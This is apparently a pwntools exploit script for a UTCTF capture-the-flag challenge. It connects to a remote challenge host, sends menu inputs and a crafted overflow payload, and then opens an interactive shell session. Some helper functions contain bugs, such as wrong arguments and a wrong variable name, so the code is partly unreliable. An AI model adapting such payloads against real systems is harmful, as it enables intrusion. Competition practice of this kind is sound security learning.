#! /usr/bin/python
from pwn import *

context.update(
        arch="amd64",
        endian="little",
        log_level="info",
        os="linux",
        terminal=["xfce4-terminal", "-e"]
)

to = 2
ru = lambda p,s: p.recvuntil(s, timeout=to)
rl = lambda p: p.recvline()
sla = lambda p,a,b: p.sendlineafter(a, b, timeout=to)
sl = lambda p,a: p.sendline(a)
up = lambda b: int.from_bytes(b, byteorder="little")

SERVICE = "challenge.utctf.live"
PORT = 7114

def start(binary):

    gs = '''
        set context-sections stack regs disasm
        set show-compact-regs on
        set resolve-heap-via-heuristic on
        set follow-fork-mode parent
        b *0x401cc5
    '''

    if args.GDB:
        return gdb.debug(binary, gdbscript=gs)
    elif args.REMOTE:
        return remote(SERVICE,PORT)
    else:
        return process(binary)

def create(p, size, value):
    ru(p,b"")
    sl(p,b"%i" % size)
    ru(p,b"")
    sl(value)

def edit(p, index, value):
    ru(p,b"")
    sl(p,"%i" % index)
    ru(p,b"")
    sl(p,value)

def delete(p, index):
    ru(p,b"")
    sl(p,"%i" % index)

def view(p, index):
    ru(p,b"")
    sl(p,"%i" % index)
    ru(p,b"")
    return rl(p)
    

def exploit(io,e):
    io.sendline(b"x\n5\n3\n4")
    payload = b"~" + b"A" * 0xc + b"\0"*0x30 + b"B"*9 + b"\x00"*7 + b"C"*0x40

    io.sendline(payload)

    p.interactive()
    

if __name__=="__main__":
    file = args.BIN

    p = start(file)
    e = context.binary = ELF(file)
    #l = ELF("./libc.so.6")

    exploit(p,e)
